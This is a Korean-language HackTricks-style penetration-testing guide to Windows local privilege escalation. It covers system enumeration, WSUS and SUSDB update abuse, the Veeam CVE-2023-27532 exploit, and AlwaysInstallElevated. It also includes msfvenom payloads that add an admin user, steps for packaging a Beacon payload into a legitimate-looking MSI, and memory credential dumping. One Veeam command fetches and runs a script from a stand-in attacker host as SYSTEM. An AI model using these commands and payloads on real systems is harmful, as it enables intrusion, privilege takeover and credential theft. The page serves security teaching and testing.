# Windows 로컬 권한 상승

{{#include ../../banners/hacktricks-training.md}}

### **Windows 로컬 권한 상승 벡터를 찾는 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

이 페이지는 여러 기초 가이드의 일반적인 Windows 권한 상승 방법론을 통합합니다.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 실제 열거 흐름은 커뮤니티 workshop과 checklist도 참고합니다.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 과거 공격 자료에는 Windows 권한 상승에 관한 DerbyCon 발표가 포함되어 있습니다.<sup>[[5]](#references)</sup>

## Windows 기초 이론

### Access Tokens

**Windows access token이 무엇인지 모른다면 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 내용은 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 integrity level이 무엇인지 모른다면 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 보안 제어

Windows에는 **시스템 열거를 방해하거나**, 실행 파일 실행을 막거나, 심지어 **사용자의 활동을 탐지할 수 있는** 여러 요소가 있습니다. 권한 상승 열거를 시작하기 전에 다음 **페이지를 읽고** 이러한 모든 **방어** **메커니즘을** **열거해야** 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess 자동 상승

`RAiLaunchAdminProcess`를 통해 실행된 UIAccess 프로세스는 AppInfo secure-path 검사를 우회할 경우 prompt 없이 High IL을 획득하는 데 악용될 수 있습니다. 전용 UIAccess/Admin Protection 우회 workflow는 여기에서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation은 임의의 SYSTEM registry write(RegPwn)에 악용될 수 있습니다:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

최근 Windows build에는 권한 있는 로컬 NTLM authentication이 재사용된 SMB TCP connection을 통해 reflect되는 **SMB arbitrary-port** LPE 경로도 도입되었습니다:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## 시스템 정보

### 버전 정보 열거

Windows 버전에 알려진 취약점이 있는지 확인하세요(적용된 patch도 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 버전 Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft security vulnerabilities에 대한 detailed information을 검색할 때 유용합니다. 이 database에는 4,700개 이상의 security vulnerabilities가 있으며, Windows environment가 제공하는 **massive attack surface**를 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas에는 watson이 embedded되어 있음)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits의 GitHub repo:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

env variables에 저장된 credential/Juicy info가 있는가?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 파일

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 이를 활성화하는 방법을 확인할 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline 실행에 대한 세부 정보가 기록되며, 실행된 명령, 명령 호출 및 스크립트의 일부가 포함됩니다. 그러나 전체 실행 세부 정보와 출력 결과가 모두 캡처되지는 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르되, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell 로그에서 최근 15개 이벤트를 확인하려면 다음을 실행합니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 전체 활동과 전체 콘텐츠 기록이 캡처되어, 실행되는 모든 코드 블록이 문서화됩니다. 이 프로세스는 각 활동에 대한 포괄적인 감사 추적을 보존하므로, 포렌식 및 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화하여 프로세스에 대한 상세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block의 logging event는 Windows Event Viewer의 다음 경로에서 확인할 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개의 event를 확인하려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트 요청에 http가 아닌 http**S**를 사용하지 않는다면 시스템을 compromise할 수 있습니다.

먼저 cmd에서 다음 명령을 실행하여 네트워크가 non-SSL WSUS 업데이트를 사용하는지 확인합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음을 사용할 수 있습니다:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"`의 값이 `1`인 경우입니다.

그러면 **exploit이 가능합니다.** 마지막 레지스트리 값이 0이면 WSUS 항목은 무시됩니다.

이 vulnerabilities를 exploit하려면 [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)와 같은 tools를 사용할 수 있습니다. 이는 non-SSL WSUS traffic에 'fake' updates를 inject하기 위한 MiTM weaponized exploit scripts입니다.

다음 research를 확인하세요:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**전체 report는 여기에서 확인하세요**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
기본적으로 이 bug가 exploit하는 flaw는 다음과 같습니다:

> 로컬 user proxy를 수정할 수 있고 Windows Updates가 Internet Explorer settings에 구성된 proxy를 사용한다면, [PyWSUS](https://github.com/GoSecure/pywsus)를 로컬에서 실행하여 자체 traffic을 intercept하고 asset에서 elevated user로 code를 실행할 수 있습니다.
>
> 또한 WSUS service는 current user의 settings를 사용하므로 해당 user의 certificate store도 사용합니다. WSUS hostname에 대한 self-signed certificate를 생성하고 이 certificate를 current user의 certificate store에 추가하면 HTTP 및 HTTPS WSUS traffic을 모두 intercept할 수 있습니다. WSUS는 certificate에 대한 trust-on-first-use 유형의 validation을 구현하기 위해 HSTS와 유사한 mechanism을 사용하지 않습니다. 제시된 certificate가 user에 의해 trusted되고 올바른 hostname을 가지고 있으면 service에서 이를 수락합니다.

[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool을 사용하여 이 vulnerability를 exploit할 수 있습니다(공개된 이후).

### `.txt`/`.esd`를 통한 SUSDB custom-update abuse: unsigned payloads

이는 HTTP WSUS connection을 intercept하는 것과는 다른 trust-boundary failure입니다. prerequisite는 custom update를 publish하고 approve하기에 충분한 **WSUS database (`SUSDB`) stored procedures** access입니다. 실용적인 진입 경로 중 하나는 upstream WSUS computer account를 `SUSDB`를 호스팅하는 별도의 MSSQL server로 relay하는 것입니다. 정확한 prerequisite는 deployment에 따라 다르므로 SQL administrator rights가 있다고 가정하지 말고 먼저 `EXECUTE` permissions를 enumerate해야 합니다.<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530에서 LDAP, SMB 또는 AD CS로 WSUS client authentication을 relay하는 별도의 attack path는 [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)를 참조하세요.

#### Update를 build, target 및 approve하기

custom-update workflow는 restricted publishing API로 legitimate WSUS procedures를 사용합니다. 중요한 state transition은 다음과 같습니다:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Update metadata import | `spImportUpdate` |
| Prerequisite, localized 및 extended XML fragments 저장 | `spSaveXMLFragment` |
| Content digest를 attacker-controlled URL과 associate | `spSetBatchURL` |
| Computer group enumerate/create 및 client 추가 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| 해당 group에 대한 installation approve | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

File name, digests, size 및 `CommandLineInstallation` handler는 imported metadata/fragments 전체에서 일치해야 합니다. Content URL과 target group을 assign한 후 최종 approval은 다음과 유사합니다. 예시 GUID를 replay하지 말고 새 update, group 및 deployment identifiers를 사용하세요.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### 확장자 기반 signature 우회

WSUS는 일반적으로 임의의 서명되지 않은 실행 파일 콘텐츠를 거부합니다. 그러나 `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`에서 .NET `VerifyFile` 경로는 제공된 파일 이름이 `.txt` 또는 `.esd`로 끝나면 인증서 검사 플래그를 false로 설정합니다. 이때 해당 바이트가 텍스트이거나 적법한 ESD 이미지인지 먼저 확인하지 않고 `CheckCertificateSignature`가 건너뛰어집니다. 따라서 변경되지 않은 PE 파일의 이름을 예를 들어 `payload.exe.txt`로 지정하면 콘텐츠 검증을 통과한 후 업데이트의 명령줄 설치 handler에 의해 실행될 수 있습니다. 이는 signature 위조가 아니라 policy/type-confusion bug입니다.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS-compatible staging 및 automation

`spDeployUpdate`를 호출하면 WSUS가 등록된 콘텐츠를 가져옵니다. 원본은 BITS의 HTTP 요구 사항을 충족해야 합니다. 접근 가능한 URL만으로는 충분하지 않습니다. 전송 과정에서 초기 `HEAD`/`GET` 흐름과 byte-range 요청을 사용하기 때문입니다. Range 지원이 없는 서버에서는 BITS에 Range protocol header가 필요하다는 내용의 WSUS 동기화 `EventId=364`가 생성됩니다.<sup>[[39]](#references)</sup>

연구용 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)는 import/fragment/URL/group/deployment chain에 필요한 SQL을 생성하고, 이를 실행하기 위한 수정된 MSSQL client를 포함하며, 콘텐츠 staging을 위한 `BitsWebServer.py`를 제공합니다. 최소한의 authorized-lab 실행 방법은 다음과 같습니다.<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### 무인 실행 및 재시도 persistence

Client-side interaction은 policy에 따라 달라집니다. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`에서 `4 - Auto download and schedule install`을 선택하면, approved update가 사용자가 수동으로 선택하지 않아도 설정된 일정에 따라 download 및 install됩니다. 테스트에서 update가 failed/incomplete 상태로 남은 payload는 callback process가 종료된 직후 다시 제공되었으므로, retry behavior가 반복적인 execution persistence로 이어질 수 있습니다. 다만 client가 update-failed 상태를 노출하므로 noisy합니다.<sup>[[39]](#references)</sup>

#### Detection 및 hardening 전환점

이 chain에서 유용한 server- 및 client-side pivot은 다음과 같습니다:<sup>[[39]](#references)</sup>

- `SUSDB`에서 `spCreateTargetGroup`, `spSetBatchURL` 및 `spDeployUpdate`의 실행을 audit합니다. 새로운 targeting group, external content origin, `.txt`/`.esd` update payload 및 예상하지 못한 principal(특히 non-computer account)이 수행한 deployment를 조사합니다.
- `C:\Program Files\Update Services\LogFiles`에서 `ContentSyncAgent`, `FileVerified`, 철자가 잘못된 `FileVerficationFailed` 및 `EventId=364`를 검토합니다. suffix를 신뢰하지 말고 payload extension 및 content magic을 기준으로 verification과 상관 분석합니다.
- Windows Update installation이 반복적으로 failing/retrying하는 상황과, `.txt` 또는 `.esd` 이름을 가진 content에서 발생하는 PE execution이나 예상하지 못한 child/network activity를 hunt합니다.
- 지원되는 경우 database service에 Extended Protection for Authentication을 요구하고, database network access를 WSUS server 및 authorized administrative system으로 제한합니다. custom-update procedure에 대한 `EXECUTE` rights를 최소화하고 audit합니다.

## Third-Party Auto-Updaters 및 Agent IPC (local privesc)

많은 enterprise agent는 localhost IPC surface와 privileged update channel을 노출합니다. enrollment가 attacker server로 coerce될 수 있고 updater가 rogue root CA 또는 weak signer check를 신뢰한다면, local user가 malicious MSI를 전달하여 SYSTEM service가 이를 install하도록 만들 수 있습니다. 일반화된 technique(Netskope stAgentSvc chain – CVE-2025-0309 기반)은 다음을 참조하십시오:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401을 통한 SYSTEM)

Veeam B&R < `11.0.1.1261`은 **TCP/9401**에서 localhost service를 노출하며, attacker-controlled message를 처리하여 **NT AUTHORITY\SYSTEM** 권한으로 arbitrary command를 실행할 수 있습니다.<sup>[[12]](#references)</sup>

- **Recon**: listener 및 version을 확인합니다. 예: `netstat -ano | findstr 9401` 및 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: 필요한 Veeam DLL과 함께 `VeeamHax.exe`와 같은 PoC를 동일한 directory에 배치한 다음, local socket을 통해 SYSTEM payload를 trigger합니다:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
서비스는 명령을 SYSTEM으로 실행합니다.
## KrbRelayUp

특정 조건에서 Windows **도메인** 환경에 **local privilege escalation** 취약점이 존재합니다. 이러한 조건에는 **LDAP signing이 강제되지 않고,** 사용자에게 **Resource-Based Constrained Delegation (RBCD)** 를 구성할 수 있는 self-rights가 있으며, 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 환경이 포함됩니다. 이러한 **requirements**는 **default settings**를 사용할 때 충족된다는 점에 유의해야 합니다.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)에서 **exploit**을 확인하세요.

공격 흐름에 대한 자세한 내용은 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>를 확인하세요.

## AlwaysInstallElevated

이 2개의 레지스트리가 **enabled** 상태(값이 **0x1**)이면, 모든 권한의 사용자가 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM**으로 **install**(execute)할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
meterpreter session이 있다면 **`exploit/windows/local/always_install_elevated`** 모듈을 사용하여 이 technique을 자동화할 수 있습니다.

### PowerUP

power-up의 `Write-UserAddMSI` command를 사용하여 현재 directory 내에 privileges를 escalate하기 위한 Windows MSI binary를 생성합니다. 이 script는 user/group 추가를 요청하는 미리 컴파일된 MSI installer를 작성하므로, GIU access가 필요합니다:
```
Write-UserAddMSI
```
생성된 binary를 실행하기만 하면 privileges를 escalate할 수 있습니다.

### MSI Wrapper

이 도구를 사용해 MSI wrapper를 만드는 방법을 알아보려면 이 tutorial을 읽으세요. **command lines**를 **execute**하기만 원하는 경우 "**.bat**" 파일을 wrap할 수도 있습니다.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike 또는 Metasploit을 사용해 **new Windows EXE TCP payload**를 `C:\privesc\beacon.exe`에 **Generate**합니다.
- **Visual Studio**를 열고 **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력합니다. **Setup Wizard** project를 선택하고 **Next**를 클릭합니다.
- project 이름(예: **AlwaysPrivesc**)을 지정하고, 위치에는 **`C:\privesc`**를 사용하며, **place solution and project in the same directory**를 선택한 다음 **Create**를 클릭합니다.
- 4단계 중 3단계(포함할 파일 선택)에 도달할 때까지 계속 **Next**를 클릭합니다. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택합니다. 그런 다음 **Finish**를 클릭합니다.
- **Solution Explorer**에서 **AlwaysPrivesc** project를 선택하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- **Author** 및 **Manufacturer**와 같이 변경할 수 있는 다른 properties도 있으며, 이를 통해 설치된 app이 더 legitimate하게 보이도록 만들 수 있습니다.
- project를 마우스 오른쪽 버튼으로 클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 마우스 오른쪽 버튼으로 클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 더블 클릭하고 `beacon.exe` 파일을 선택한 다음 **OK**를 클릭합니다. 이렇게 하면 installer가 실행되는 즉시 Beacon payload가 execute됩니다.
- **Custom Action Properties**에서 **Run64Bit**을 **True**로 변경합니다.
- 마지막으로 **build**합니다.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` warning이 표시되면 platform을 x64로 설정했는지 확인합니다.

### MSI Installation

악성 `.msi` 파일을 **background**에서 **installation**하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 exploit하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## Antivirus 및 Detectors

### Audit Settings

이 설정은 무엇이 **로그 기록되는지** 결정하므로 주의해야 합니다.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding은 로그가 어디로 전송되는지 알아두면 유용합니다.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 Administrator 비밀번호 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고 무작위로 생성되며 정기적으로 업데이트**되도록 보장합니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며, ACL을 통해 충분한 권한을 부여받은 사용자만 액세스할 수 있습니다. 이를 통해 권한이 부여된 사용자는 로컬 admin 비밀번호를 확인할 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화된 경우 **평문 비밀번호가 LSASS**(Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 자세한 정보 확인**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority(LSA)에 대한 보호 기능을 강화하여, 신뢰할 수 없는 프로세스가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**하고 시스템을 더욱 안전하게 보호했습니다.\
[**LSA Protection에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 이 기능의 목적은 pass-the-hash 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호하는 것입니다. [**Credential Guard에 대한 자세한 정보는 여기에서 확인할 수 있습니다.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**도메인 자격 증명**은 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 활용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면 일반적으로 해당 사용자의 도메인 자격 증명이 설정됩니다.\
[**Cached Credentials에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹 중 흥미로운 권한을 가진 그룹이 있는지 확인해야 합니다.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 권한이 있는 그룹

**일부 권한이 있는 그룹에 속해 있으면 권한을 상승할 수 있습니다**. 권한이 있는 그룹과 이를 악용하여 권한을 상승하는 방법은 여기에서 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

이 페이지에서 **token**이 무엇인지 **자세히 알아보세요**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지에서 **흥미로운 token**과 이를 악용하는 방법을 **알아보세요**:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인한 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

먼저 프로세스를 나열할 때 **프로세스의 명령줄 내부에 비밀번호가 있는지 확인하세요**.\
**실행 중인 바이너리를 덮어쓸 수 있는지** 또는 가능한 [**DLL Hijacking attacks**](dll-hijacking/index.html)을 악용하기 위해 바이너리 폴더에 쓰기 권한이 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 실행 중인 [**electron/cef/chromium debuggers**]([../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md))가 있는지 확인하세요. 이를 악용하여 권한을 상승시킬 수 있습니다.

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리가 있는 폴더의 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals의 **procdump**를 사용하여 실행 중인 프로세스의 memory dump를 생성할 수 있습니다. FTP와 같은 서비스는 **memory에 credentials가 clear text로 저장**되어 있으므로, memory를 dump한 후 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 안전하지 않은 GUI 앱

**SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색하도록 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색한 다음 "Click to open Command Prompt"를 클릭합니다.

## 서비스

Service Triggers를 사용하면 특정 조건(명명된 파이프/RPC endpoint 활동, ETW 이벤트, IP 가용성, 장치 연결, GPO 새로 고침 등)이 발생할 때 Windows가 서비스를 시작하도록 할 수 있습니다. SERVICE_START 권한이 없어도 트리거를 발생시켜 권한 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 다음에서 확인하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

**sc**를 사용하여 서비스 정보를 확인할 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_의 **accesschk** 바이너리를 사용하는 것이 좋습니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 서비스를 수정할 수 있는지 확인하는 것이 좋습니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
